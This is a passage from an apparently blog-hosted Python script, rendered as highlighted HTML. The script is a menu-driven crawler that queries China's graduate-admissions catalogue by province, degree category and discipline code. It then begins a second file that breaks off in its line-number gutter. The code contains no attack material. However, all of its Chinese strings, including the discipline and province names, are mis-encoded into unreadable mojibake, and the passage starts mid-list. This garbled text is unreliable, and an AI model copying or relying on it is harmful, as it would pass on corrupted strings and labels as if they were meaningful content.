['(0601)è€ƒå¤å­¦', '(0602)ä¸­å›½å²', '(0603)ä¸–ç•Œå²']</span></span><br><span class=\"line\"><span class=\"string\">                (07)ç†å­¦</span></span><br><span class=\"line\"><span class=\"string\">                ['(0701)æ•°å­¦', '(0702)ç‰©ç†å­¦', '(0703)åŒ–å­¦', '(0704)å¤©æ–‡å­¦', '(0705)åœ°ç†å­¦', '(0706)å¤§æ°”ç§‘å­¦', '(0707)æµ·æ´‹ç§‘å­¦',</span></span><br><span class=\"line\"><span class=\"string\">                 '(0708)åœ°çƒç‰©ç†å­¦', '(0709)åœ°è´¨å­¦', '(0710)ç”Ÿç‰©å­¦', '(0711)ç³»ç»Ÿç§‘å­¦', '(0712)ç§‘å­¦æŠ€æœ¯å²', '(0713)ç”Ÿæ€å­¦', '</span></span><br><span class=\"line\"><span class=\"string\">                 (0714)ç»Ÿè®¡å­¦', '(0771)å¿ƒç†å­¦', '(0772)åŠ›å­¦', '(0773)ææ–™ç§‘å­¦ä¸å·¥ç¨‹', '(0774)ç”µå­ç§‘å­¦ä¸æŠ€æœ¯', '(0775)è®¡ç®—æœºç§‘å­¦ä¸æŠ€æœ¯',</span></span><br><span class=\"line\"><span class=\"string\">                 '(0776)ç¯å¢ƒç§‘å­¦ä¸å·¥ç¨‹', '(0777)ç”Ÿç‰©åŒ»å­¦å·¥ç¨‹', '(0778)åŸºç¡€åŒ»å­¦', '(0779)å…¬å…±å«ç”Ÿä¸é¢„é˜²åŒ»å­¦', '(0780)è¯å­¦',</span></span><br><span class=\"line\"><span class=\"string\">                 '(0781)ä¸­è¯å­¦', '(0782)åŒ»å­¦æŠ€æœ¯', '(0783)æŠ¤ç†å­¦', '(0784)', '(0785)', '(0786)']</span></span><br><span class=\"line\"><span class=\"string\">                (08)å·¥å­¦</span></span><br><span class=\"line\"><span class=\"string\">                ['(0801)åŠ›å­¦', '(0802)æœºæ¢°å·¥ç¨‹', '(0803)å…‰å­¦å·¥ç¨‹', '(0804)ä»ªå™¨ç§‘å­¦ä¸æŠ€æœ¯', '(0805)ææ–™ç§‘å­¦ä¸å·¥ç¨‹', '(0806)å†¶é‡‘å·¥ç¨‹',</span></span><br><span class=\"line\"><span class=\"string\">                '(0807)åŠ¨åŠ›å·¥ç¨‹åŠå·¥ç¨‹çƒ­ç‰©ç†', '(0808)ç”µæ°”å·¥ç¨‹', '(0809)ç”µå­ç§‘å­¦ä¸æŠ€æœ¯', '(0810)ä¿¡æ¯ä¸é€šä¿¡å·¥ç¨‹', '(0811)æ§åˆ¶ç§‘å­¦ä¸å·¥ç¨‹',</span></span><br><span class=\"line\"><span class=\"string\">                '(0812)è®¡ç®—æœºç§‘å­¦ä¸æŠ€æœ¯', '(0813)å»ºç­‘å­¦', '(0814)åœŸæœ¨å·¥ç¨‹', '(0815)æ°´åˆ©å·¥ç¨‹', '(0816)æµ‹ç»˜ç§‘å­¦ä¸æŠ€æœ¯',</span></span><br><span class=\"line\"><span class=\"string\">                '(0817)åŒ–å­¦å·¥ç¨‹ä¸æŠ€æœ¯', '(0818)åœ°è´¨èµ„æºä¸åœ°è´¨å·¥ç¨‹', '(0819)çŸ¿ä¸šå·¥ç¨‹', '(0820)çŸ³æ²¹ä¸å¤©ç„¶æ°”å·¥ç¨‹', '(0821)çººç»‡ç§‘å­¦ä¸å·¥ç¨‹',</span></span><br><span class=\"line\"><span class=\"string\">                '(0822)è½»å·¥æŠ€æœ¯ä¸å·¥ç¨‹', '(0823)äº¤é€šè¿è¾“å·¥ç¨‹', '(0824)èˆ¹èˆ¶ä¸æµ·æ´‹å·¥ç¨‹', '(0825)èˆªç©ºå®‡èˆªç§‘å­¦ä¸æŠ€æœ¯', '(0826)å…µå™¨ç§‘å­¦ä¸æŠ€æœ¯',</span></span><br><span class=\"line\"><span class=\"string\">                '(0827)æ ¸ç§‘å­¦ä¸æŠ€æœ¯', '(0828)å†œä¸šå·¥ç¨‹', '(0829)æ—ä¸šå·¥ç¨‹', '(0830)ç¯å¢ƒç§‘å­¦ä¸å·¥ç¨‹', '(0831)ç”Ÿç‰©åŒ»å­¦å·¥ç¨‹',</span></span><br><span class=\"line\"><span class=\"string\">                '(0832)é£Ÿå“ç§‘å­¦ä¸å·¥ç¨‹', '(0833)åŸä¹¡è§„åˆ’å­¦', '(0834)é£æ™¯å›­æ—å­¦', '(0835)è½¯ä»¶å·¥ç¨‹', '(0836)ç”Ÿç‰©å·¥ç¨‹', '(0837)å®‰å…¨ç§‘å­¦ä¸å·¥ç¨‹',</span></span><br><span class=\"line\"><span class=\"string\">                '(0838)å…¬å®‰æŠ€æœ¯', '(0839)ç½‘ç»œç©ºé—´å®‰å…¨', '(0870)ç§‘å­¦æŠ€æœ¯å²', '(0871)ç®¡ç†ç§‘å­¦ä¸å·¥ç¨‹', '(0872)è®¾è®¡å­¦']</span></span><br><span class=\"line\"><span class=\"string\">                (09)å†œå­¦</span></span><br><span class=\"line\"><span class=\"string\">                ['(0901)ä½œç‰©å­¦', '(0902)å›­è‰ºå­¦', '(0903)å†œä¸šèµ„æºä¸ç¯å¢ƒ', '(0904)æ¤ç‰©ä¿æŠ¤', '(0905)ç•œç‰§å­¦', '(0906)å…½åŒ»å­¦', '(0907)æ—å­¦',</span></span><br><span class=\"line\"><span class=\"string\">                '(0908)æ°´äº§', '(0909)è‰å­¦', '(0970)ç§‘å­¦æŠ€æœ¯å²', '(0971)ç¯å¢ƒç§‘å­¦ä¸å·¥ç¨‹', '(0972)é£Ÿå“ç§‘å­¦ä¸å·¥ç¨‹', '(0973)é£æ™¯å›­æ—å­¦']</span></span><br><span class=\"line\"><span class=\"string\">                (10)åŒ»å­¦</span></span><br><span class=\"line\"><span class=\"string\">                ['(1001)åŸºç¡€åŒ»å­¦', '(1002)ä¸´åºŠåŒ»å­¦', '(1003)å£è…”åŒ»å­¦', '(1004)å…¬å…±å«ç”Ÿä¸é¢„é˜²åŒ»å­¦', '(1005)ä¸­åŒ»å­¦', '(1006)ä¸­è¥¿åŒ»ç»“åˆ',</span></span><br><span class=\"line\"><span class=\"string\">                '(1007)è¯å­¦', '(1008)ä¸­è¯å­¦', '(1009)ç‰¹ç§åŒ»å­¦', '(1010)åŒ»å­¦æŠ€æœ¯', '(1011)æŠ¤ç†å­¦', '(1071)ç§‘å­¦æŠ€æœ¯å²', '(1072)ç”Ÿç‰©åŒ»å­¦å·¥ç¨‹',</span></span><br><span class=\"line\"><span class=\"string\">                 '(1073)', '(1074)']</span></span><br><span class=\"line\"><span class=\"string\">                (11)å†›äº‹å­¦</span></span><br><span class=\"line\"><span class=\"string\">                ['(1101)å†›äº‹æ€æƒ³åŠå†›äº‹å†å²', '(1102)æˆ˜ç•¥å­¦', '(1103)æˆ˜å½¹å­¦', '(1104)æˆ˜æœ¯å­¦', '(1105)å†›é˜ŸæŒ‡æŒ¥å­¦', '(1106)å†›äº‹ç®¡ç†å­¦',</span></span><br><span class=\"line\"><span class=\"string\">                '(1107)å†›é˜Ÿæ”¿æ²»å·¥ä½œå­¦', '(1108)å†›äº‹åå‹¤å­¦', '(1109)å†›äº‹è£…å¤‡å­¦', '(1110)å†›äº‹è®­ç»ƒå­¦']</span></span><br><span class=\"line\"><span class=\"string\">                (12)ç®¡ç†å­¦</span></span><br><span class=\"line\"><span class=\"string\">                ['(1201)ç®¡ç†ç§‘å­¦ä¸å·¥ç¨‹', '(1202)å·¥å•†ç®¡ç†', '(1203)å†œæ—ç»æµç®¡ç†', '(1204)å…¬å…±ç®¡ç†', '(1205)å›¾ä¹¦æƒ…æŠ¥ä¸æ¡£æ¡ˆç®¡ç†']</span></span><br><span class=\"line\"><span class=\"string\">                (13)è‰ºæœ¯å­¦</span></span><br><span class=\"line\"><span class=\"string\">                ['(1301)è‰ºæœ¯å­¦ç†è®º', '(1302)éŸ³ä¹ä¸èˆè¹ˆå­¦', '(1303)æˆå‰§ä¸å½±è§†å­¦', '(1304)ç¾æœ¯å­¦', '(1305)è®¾è®¡å­¦']</span></span><br><span class=\"line\"><span class=\"string\">            \"\"\"</span></span><br><span class=\"line\">                  <span class=\"string\">\"\"</span>)</span><br><span class=\"line\">            print(<span class=\"string\">\"è¯·æ ¹æ®ä¸Šæ–¹å¯¹åº”å…³ç³»è¾“å…¥é—¨ç±»ç±»åˆ«ä»£ç ã€å­¦ç§‘ç±»åˆ«ä»£ç è¿›è¡Œå›¾è¡¨ç”Ÿæˆï¼š\"</span>.center(<span class=\"number\">50</span>, <span class=\"string\">'-'</span>))</span><br><span class=\"line\">            print(<span class=\"string\">\"ä¾‹å¦‚:zyxw 0854 å°†ä¼šç»˜åˆ¶å¼€è®¾ ä¸“ä¸šå­¦ä½ ç”µå­ä¿¡æ¯ çš„é«˜æ ¡åœ¨å…¨å›½çš„åˆ†å¸ƒä¿¡æ¯\"</span>.center(<span class=\"number\">60</span>, <span class=\"string\">'-'</span>))</span><br><span class=\"line\">            mldm = str(input(<span class=\"string\">\"è¯·è¾“å…¥é—¨ç±»ç±»åˆ«ä»£ç ï¼š \"</span>)).strip()</span><br><span class=\"line\">            yjxkdm = str(input(<span class=\"string\">\"è¯·è¾“å…¥å­¦ç§‘ç±»åˆ«ä»£ç ï¼š \"</span>)).strip()</span><br><span class=\"line\">            url = <span class=\"string\">\"https://yz.chsi.com.cn/zsml/queryAction.do\"</span></span><br><span class=\"line\">            crawler = CSCrawler(url,yjxkdm)</span><br><span class=\"line\">            crawler.SchoolMap(mldm)</span><br><span class=\"line\">            print(<span class=\"string\">\"æ­£åœ¨æ”¶é›†æ•°æ®...\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span>(code == str(<span class=\"number\">2</span>)):</span><br><span class=\"line\">            print(<span class=\"string\">\"æ­£åœ¨åŠ è½½ç›®æ ‡çœä»½å†…ä¸ªé«˜æ ¡å¯¹ç›¸å…³ä¸“ä¸šçš„æ‹›æ”¶æƒ…å†µçš„ç¨‹åº...\"</span>)</span><br><span class=\"line\">            time.sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\">            print(<span class=\"string\">\"\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">                  <span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">            åŸå¸‚ä»£ç ï¼š</span></span><br><span class=\"line\"><span class=\"string\">                ['(11)åŒ—äº¬å¸‚', '(12)å¤©æ´¥å¸‚', '(13)æ²³åŒ—çœ', '(14)å±±è¥¿çœ', '(15)å†…è’™å¤è‡ªæ²»åŒº', '(21)è¾½å®çœ', '(22)å‰æ—çœ', </span></span><br><span class=\"line\"><span class=\"string\">                '(23)é»‘é¾™æ±Ÿçœ', '(31)ä¸Šæµ·å¸‚', '(32)æ±Ÿè‹çœ', '(33)æµ™æ±Ÿçœ', '(34)å®‰å¾½çœ', '(35)ç¦å»ºçœ', '(36)æ±Ÿè¥¿çœ', '</span></span><br><span class=\"line\"><span class=\"string\">                (37)å±±ä¸œçœ', '(41)æ²³å—çœ', '(42)æ¹–åŒ—çœ', '(43)æ¹–å—çœ', '(44)å¹¿ä¸œçœ', '(45)å¹¿è¥¿å£®æ—è‡ªæ²»åŒº', '(46)æµ·å—çœ', </span></span><br><span class=\"line\"><span class=\"string\">                '(50)é‡åº†å¸‚', '(51)å››å·çœ', '(52)è´µå·çœ', '(53)äº‘å—çœ', '(54)è¥¿è—è‡ªæ²»åŒº', '(61)é™•è¥¿çœ', '(62)ç”˜è‚ƒçœ', </span></span><br><span class=\"line\"><span class=\"string\">                '(63)é’æµ·çœ', '(64)å®å¤å›æ—è‡ªæ²»åŒº', '(65)æ–°ç–†ç»´å¾å°”è‡ªæ²»åŒº']</span></span><br><span class=\"line\"><span class=\"string\">            é—¨ç±»ç±»åˆ«ï¼š</span></span><br><span class=\"line\"><span class=\"string\">                ä¸“ä¸šå­¦ä½ï¼š</span></span><br><span class=\"line\"><span class=\"string\">                (zyxw)ä¸“ä¸šå­¦ä½</span></span><br><span class=\"line\"><span class=\"string\">                ['(0251)é‡‘è', '(0252)åº”ç”¨ç»Ÿè®¡', '(0253)ç¨åŠ¡', '(0254)å›½é™…å•†åŠ¡', '(0255)ä¿é™©', '(0256)èµ„äº§è¯„ä¼°',</span></span><br><span class=\"line\"><span class=\"string\">                          '(0257)å®¡è®¡', '(0351)æ³•å¾‹', '(0352)ç¤¾ä¼šå·¥ä½œ', '(0353)è­¦åŠ¡', '(0451)æ•™è‚²', '(0452)ä½“è‚²',</span></span><br><span class=\"line\"><span class=\"string\">                          '(0453)æ±‰è¯­å›½é™…æ•™è‚²', '(0454)åº”ç”¨å¿ƒç†', '(0551)ç¿»è¯‘', '(0552)æ–°é—»ä¸ä¼ æ’­', '(0553)å‡ºç‰ˆ',</span></span><br><span class=\"line\"><span class=\"string\">                          '(0651)æ–‡ç‰©ä¸åšç‰©é¦†', '(0851)å»ºç­‘å­¦', '(0853)åŸå¸‚è§„åˆ’', '(0854)ç”µå­ä¿¡æ¯', '(0855)æœºæ¢°',</span></span><br><span class=\"line\"><span class=\"string\">                          '(0856)ææ–™ä¸åŒ–å·¥', '(0857)èµ„æºä¸ç¯å¢ƒ', '(0858)èƒ½æºåŠ¨åŠ›', '(0859)åœŸæœ¨æ°´åˆ©', '(0860)ç”Ÿç‰©ä¸åŒ»è¯',</span></span><br><span class=\"line\"><span class=\"string\">                          '(0861)äº¤é€šè¿è¾“', '(0951)å†œä¸š', '(0952)å…½åŒ»', '(0953)é£æ™¯å›­æ—', '(0954)æ—ä¸š', '(1051)ä¸´åºŠåŒ»å­¦',</span></span><br><span class=\"line\"><span class=\"string\">                          '(1052)å£è…”åŒ»å­¦', '(1053)å…¬å…±å«ç”Ÿ', '(1054)æŠ¤ç†', '(1055)è¯å­¦', '(1056)ä¸­è¯å­¦', '(1057)ä¸­åŒ»',</span></span><br><span class=\"line\"><span class=\"string\">                          '(1151)å†›äº‹', '(1251)å·¥å•†ç®¡ç†', '(1252)å…¬å…±ç®¡ç†', '(1253)ä¼šè®¡', '(1254)æ—…æ¸¸ç®¡ç†', '(1255)å›¾ä¹¦æƒ…æŠ¥',</span></span><br><span class=\"line\"><span class=\"string\">                          '(1256)å·¥ç¨‹ç®¡ç†', '(1351)è‰ºæœ¯']</span></span><br><span class=\"line\"><span class=\"string\">                å­¦æœ¯å­¦ä½ï¼š</span></span><br><span class=\"line\"><span class=\"string\">                (01)å“²å­¦</span></span><br><span class=\"line\"><span class=\"string\">                ['(0101)å“²å­¦']</span></span><br><span class=\"line\"><span class=\"string\">                (02)ç»æµå­¦</span></span><br><span class=\"line\"><span class=\"string\">                ['(0201)ç†è®ºç»æµå­¦', '(0202)åº”ç”¨ç»æµå­¦', '(0270)ç»Ÿè®¡å­¦']</span></span><br><span class=\"line\"><span class=\"string\">                (03)æ³•å­¦</span></span><br><span class=\"line\"><span class=\"string\">                ['(0301)æ³•å­¦', '(0302)æ”¿æ²»å­¦', '(0303)ç¤¾ä¼šå­¦', '(0304)æ°‘æ—å­¦', '(0305)é©¬å…‹æ€ä¸»ä¹‰ç†è®º', '(0306)å…¬å®‰å­¦']</span></span><br><span class=\"line\"><span class=\"string\">                (04)æ•™è‚²å­¦</span></span><br><span class=\"line\"><span class=\"string\">                ['(0401)æ•™è‚²å­¦', '(0402)å¿ƒç†å­¦', '(0403)ä½“è‚²å­¦', '(0471)']</span></span><br><span class=\"line\"><span class=\"string\">                (05)æ–‡å­¦</span></span><br><span class=\"line\"><span class=\"string\">                ['(0501)ä¸­å›½è¯­è¨€æ–‡å­¦', '(0502)å¤–å›½è¯­è¨€æ–‡å­¦', '(0503)æ–°é—»ä¼ æ’­å­¦']</span></span><br><span class=\"line\"><span class=\"string\">                (06)å†å²å­¦</span></span><br><span class=\"line\"><span class=\"string\">                ['(0601)è€ƒå¤å­¦', '(0602)ä¸­å›½å²', '(0603)ä¸–ç•Œå²']</span></span><br><span class=\"line\"><span class=\"string\">                (07)ç†å­¦</span></span><br><span class=\"line\"><span class=\"string\">                ['(0701)æ•°å­¦', '(0702)ç‰©ç†å­¦', '(0703)åŒ–å­¦', '(0704)å¤©æ–‡å­¦', '(0705)åœ°ç†å­¦', '(0706)å¤§æ°”ç§‘å­¦', '(0707)æµ·æ´‹ç§‘å­¦',</span></span><br><span class=\"line\"><span class=\"string\">                 '(0708)åœ°çƒç‰©ç†å­¦', '(0709)åœ°è´¨å­¦', '(0710)ç”Ÿç‰©å­¦', '(0711)ç³»ç»Ÿç§‘å­¦', '(0712)ç§‘å­¦æŠ€æœ¯å²', '(0713)ç”Ÿæ€å­¦', '</span></span><br><span class=\"line\"><span class=\"string\">                 (0714)ç»Ÿè®¡å­¦', '(0771)å¿ƒç†å­¦', '(0772)åŠ›å­¦', '(0773)ææ–™ç§‘å­¦ä¸å·¥ç¨‹', '(0774)ç”µå­ç§‘å­¦ä¸æŠ€æœ¯', '(0775)è®¡ç®—æœºç§‘å­¦ä¸æŠ€æœ¯',</span></span><br><span class=\"line\"><span class=\"string\">                 '(0776)ç¯å¢ƒç§‘å­¦ä¸å·¥ç¨‹', '(0777)ç”Ÿç‰©åŒ»å­¦å·¥ç¨‹', '(0778)åŸºç¡€åŒ»å­¦', '(0779)å…¬å…±å«ç”Ÿä¸é¢„é˜²åŒ»å­¦', '(0780)è¯å­¦',</span></span><br><span class=\"line\"><span class=\"string\">                 '(0781)ä¸­è¯å­¦', '(0782)åŒ»å­¦æŠ€æœ¯', '(0783)æŠ¤ç†å­¦', '(0784)', '(0785)', '(0786)']</span></span><br><span class=\"line\"><span class=\"string\">                (08)å·¥å­¦</span></span><br><span class=\"line\"><span class=\"string\">                ['(0801)åŠ›å­¦', '(0802)æœºæ¢°å·¥ç¨‹', '(0803)å…‰å­¦å·¥ç¨‹', '(0804)ä»ªå™¨ç§‘å­¦ä¸æŠ€æœ¯', '(0805)ææ–™ç§‘å­¦ä¸å·¥ç¨‹', '(0806)å†¶é‡‘å·¥ç¨‹',</span></span><br><span class=\"line\"><span class=\"string\">                '(0807)åŠ¨åŠ›å·¥ç¨‹åŠå·¥ç¨‹çƒ­ç‰©ç†', '(0808)ç”µæ°”å·¥ç¨‹', '(0809)ç”µå­ç§‘å­¦ä¸æŠ€æœ¯', '(0810)ä¿¡æ¯ä¸é€šä¿¡å·¥ç¨‹', '(0811)æ§åˆ¶ç§‘å­¦ä¸å·¥ç¨‹',</span></span><br><span class=\"line\"><span class=\"string\">                '(0812)è®¡ç®—æœºç§‘å­¦ä¸æŠ€æœ¯', '(0813)å»ºç­‘å­¦', '(0814)åœŸæœ¨å·¥ç¨‹', '(0815)æ°´åˆ©å·¥ç¨‹', '(0816)æµ‹ç»˜ç§‘å­¦ä¸æŠ€æœ¯',</span></span><br><span class=\"line\"><span class=\"string\">                '(0817)åŒ–å­¦å·¥ç¨‹ä¸æŠ€æœ¯', '(0818)åœ°è´¨èµ„æºä¸åœ°è´¨å·¥ç¨‹', '(0819)çŸ¿ä¸šå·¥ç¨‹', '(0820)çŸ³æ²¹ä¸å¤©ç„¶æ°”å·¥ç¨‹', '(0821)çººç»‡ç§‘å­¦ä¸å·¥ç¨‹',</span></span><br><span class=\"line\"><span class=\"string\">                '(0822)è½»å·¥æŠ€æœ¯ä¸å·¥ç¨‹', '(0823)äº¤é€šè¿è¾“å·¥ç¨‹', '(0824)èˆ¹èˆ¶ä¸æµ·æ´‹å·¥ç¨‹', '(0825)èˆªç©ºå®‡èˆªç§‘å­¦ä¸æŠ€æœ¯', '(0826)å…µå™¨ç§‘å­¦ä¸æŠ€æœ¯',</span></span><br><span class=\"line\"><span class=\"string\">                '(0827)æ ¸ç§‘å­¦ä¸æŠ€æœ¯', '(0828)å†œä¸šå·¥ç¨‹', '(0829)æ—ä¸šå·¥ç¨‹', '(0830)ç¯å¢ƒç§‘å­¦ä¸å·¥ç¨‹', '(0831)ç”Ÿç‰©åŒ»å­¦å·¥ç¨‹',</span></span><br><span class=\"line\"><span class=\"string\">                '(0832)é£Ÿå“ç§‘å­¦ä¸å·¥ç¨‹', '(0833)åŸä¹¡è§„åˆ’å­¦', '(0834)é£æ™¯å›­æ—å­¦', '(0835)è½¯ä»¶å·¥ç¨‹', '(0836)ç”Ÿç‰©å·¥ç¨‹', '(0837)å®‰å…¨ç§‘å­¦ä¸å·¥ç¨‹',</span></span><br><span class=\"line\"><span class=\"string\">                '(0838)å…¬å®‰æŠ€æœ¯', '(0839)ç½‘ç»œç©ºé—´å®‰å…¨', '(0870)ç§‘å­¦æŠ€æœ¯å²', '(0871)ç®¡ç†ç§‘å­¦ä¸å·¥ç¨‹', '(0872)è®¾è®¡å­¦']</span></span><br><span class=\"line\"><span class=\"string\">                (09)å†œå­¦</span></span><br><span class=\"line\"><span class=\"string\">                ['(0901)ä½œç‰©å­¦', '(0902)å›­è‰ºå­¦', '(0903)å†œä¸šèµ„æºä¸ç¯å¢ƒ', '(0904)æ¤ç‰©ä¿æŠ¤', '(0905)ç•œç‰§å­¦', '(0906)å…½åŒ»å­¦', '(0907)æ—å­¦',</span></span><br><span class=\"line\"><span class=\"string\">                '(0908)æ°´äº§', '(0909)è‰å­¦', '(0970)ç§‘å­¦æŠ€æœ¯å²', '(0971)ç¯å¢ƒç§‘å­¦ä¸å·¥ç¨‹', '(0972)é£Ÿå“ç§‘å­¦ä¸å·¥ç¨‹', '(0973)é£æ™¯å›­æ—å­¦']</span></span><br><span class=\"line\"><span class=\"string\">                (10)åŒ»å­¦</span></span><br><span class=\"line\"><span class=\"string\">                ['(1001)åŸºç¡€åŒ»å­¦', '(1002)ä¸´åºŠåŒ»å­¦', '(1003)å£è…”åŒ»å­¦', '(1004)å…¬å…±å«ç”Ÿä¸é¢„é˜²åŒ»å­¦', '(1005)ä¸­åŒ»å­¦', '(1006)ä¸­è¥¿åŒ»ç»“åˆ',</span></span><br><span class=\"line\"><span class=\"string\">                '(1007)è¯å­¦', '(1008)ä¸­è¯å­¦', '(1009)ç‰¹ç§åŒ»å­¦', '(1010)åŒ»å­¦æŠ€æœ¯', '(1011)æŠ¤ç†å­¦', '(1071)ç§‘å­¦æŠ€æœ¯å²', '(1072)ç”Ÿç‰©åŒ»å­¦å·¥ç¨‹',</span></span><br><span class=\"line\"><span class=\"string\">                 '(1073)', '(1074)']</span></span><br><span class=\"line\"><span class=\"string\">                (11)å†›äº‹å­¦</span></span><br><span class=\"line\"><span class=\"string\">                ['(1101)å†›äº‹æ€æƒ³åŠå†›äº‹å†å²', '(1102)æˆ˜ç•¥å­¦', '(1103)æˆ˜å½¹å­¦', '(1104)æˆ˜æœ¯å­¦', '(1105)å†›é˜ŸæŒ‡æŒ¥å­¦', '(1106)å†›äº‹ç®¡ç†å­¦',</span></span><br><span class=\"line\"><span class=\"string\">                '(1107)å†›é˜Ÿæ”¿æ²»å·¥ä½œå­¦', '(1108)å†›äº‹åå‹¤å­¦', '(1109)å†›äº‹è£…å¤‡å­¦', '(1110)å†›äº‹è®­ç»ƒå­¦']</span></span><br><span class=\"line\"><span class=\"string\">                (12)ç®¡ç†å­¦</span></span><br><span class=\"line\"><span class=\"string\">                ['(1201)ç®¡ç†ç§‘å­¦ä¸å·¥ç¨‹', '(1202)å·¥å•†ç®¡ç†', '(1203)å†œæ—ç»æµç®¡ç†', '(1204)å…¬å…±ç®¡ç†', '(1205)å›¾ä¹¦æƒ…æŠ¥ä¸æ¡£æ¡ˆç®¡ç†']</span></span><br><span class=\"line\"><span class=\"string\">                (13)è‰ºæœ¯å­¦</span></span><br><span class=\"line\"><span class=\"string\">                ['(1301)è‰ºæœ¯å­¦ç†è®º', '(1302)éŸ³ä¹ä¸èˆè¹ˆå­¦', '(1303)æˆå‰§ä¸å½±è§†å­¦', '(1304)ç¾æœ¯å­¦', '(1305)è®¾è®¡å­¦']</span></span><br><span class=\"line\"><span class=\"string\">            \"\"\"</span></span><br><span class=\"line\">                  <span class=\"string\">\"\"</span>)</span><br><span class=\"line\">            print(<span class=\"string\">\"è¯·æ ¹æ®ä¸Šæ–¹å¯¹åº”å…³ç³»è¾“å…¥åŸå¸‚ä»£ç ã€é—¨ç±»ç±»åˆ«ä»£ç ã€å­¦ç§‘ç±»åˆ«ä»£ç è¿›è¡Œå›¾è¡¨ç”Ÿæˆï¼š\"</span>.center(<span class=\"number\">50</span>, <span class=\"string\">'-'</span>))</span><br><span class=\"line\">            print(<span class=\"string\">\"ä¾‹å¦‚:41 zyxw 0854 å°†ä¼šæŸ¥è¯¢ æ²³å—çœ ä¸“ä¸šå­¦ä½ ç”µå­ä¿¡æ¯ çš„ç›¸å…³ä¿¡æ¯\"</span>.center(<span class=\"number\">60</span>, <span class=\"string\">'-'</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">            url = <span class=\"string\">\"https://yz.chsi.com.cn/zsml/queryAction.do\"</span></span><br><span class=\"line\">            count = str(input(<span class=\"string\">\"è¯·è¾“å…¥åŸå¸‚ä»£ç ï¼š \"</span>)).strip()</span><br><span class=\"line\">            mldm = str(input(<span class=\"string\">\"è¯·è¾“å…¥é—¨ç±»ç±»åˆ«ä»£ç ï¼š \"</span>)).strip()</span><br><span class=\"line\">            yjxkdm = str(input(<span class=\"string\">\"è¯·è¾“å…¥å­¦ç§‘ç±»åˆ«ä»£ç ï¼š \"</span>)).strip()</span><br><span class=\"line\">            crawler = CSCrawler(url, yjxkdm)</span><br><span class=\"line\">            crawler.ResearchDirection(count,mldm)</span><br><span class=\"line\">            print(<span class=\"string\">\"æ­£åœ¨æ”¶é›†æ•°æ®...\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span>(code == str(<span class=\"number\">3</span>)):</span><br><span class=\"line\">            print(<span class=\"string\">\"æ­£åœ¨è®°è½½ç›®æ ‡é™¢æ ¡å¯¹åº”ä¸“ä¸šçš„ç ”ç©¶æ–¹å‘ä¸æ‹Ÿæ‹›ç”Ÿäººæ•°æƒ…å†µçš„ç¨‹åº...\"</span>)</span><br><span class=\"line\">            time.sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\">            print(<span class=\"string\">\"\"</span></span><br><span class=\"line\">                  <span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">        è¯·åˆ†è¡Œè¾“å…¥å®Œæ•´çš„å­¦æ ¡åç§°ä¸å­¦ç§‘ç±»åˆ«ä»£ç ï¼Œå¦‚ï¼š</span></span><br><span class=\"line\"><span class=\"string\">            å­¦æ ¡åç§°ï¼šåŒ—äº¬å¤§å­¦</span></span><br><span class=\"line\"><span class=\"string\">            ä¸“ä¸šç±»åˆ«ä»£ç ï¼š0202\"\"\"</span></span><br><span class=\"line\">                  )</span><br><span class=\"line\">            schoolname = str(input(<span class=\"string\">\"è¯·è¾“å…¥å­¦æ ¡åç§°ï¼š \"</span>)).strip()</span><br><span class=\"line\">            yjxkdm = str(input(<span class=\"string\">\"è¯·è¾“å…¥å­¦ç§‘ç±»åˆ«ä»£ç ï¼š \"</span>)).strip()</span><br><span class=\"line\">            url = <span class=\"string\">\"https://yz.chsi.com.cn/zsml/queryAction.do\"</span></span><br><span class=\"line\">            crawler = CSCrawler(url, yjxkdm)</span><br><span class=\"line\">            crawler.RDsBySchoolName(schoolname)</span><br><span class=\"line\"></span><br><span class=\"line\">            print(<span class=\"string\">\"æ­£åœ¨æ”¶é›†æ•°æ®...\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span>(code == str(<span class=\"number\">4</span>)):</span><br><span class=\"line\">            print(<span class=\"string\">\"æ­£åœ¨é€€å‡º...\"</span>)</span><br><span class=\"line\">            time.sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"å¯¹ä¸èµ·ï¼Œæš‚ä¸æ”¯æŒæ­¤æ“ä½œï¼è¯·é‡æ–°è¾“å…¥...\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n\n<p><strong>SchoolMapByPyEcharts.py</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span 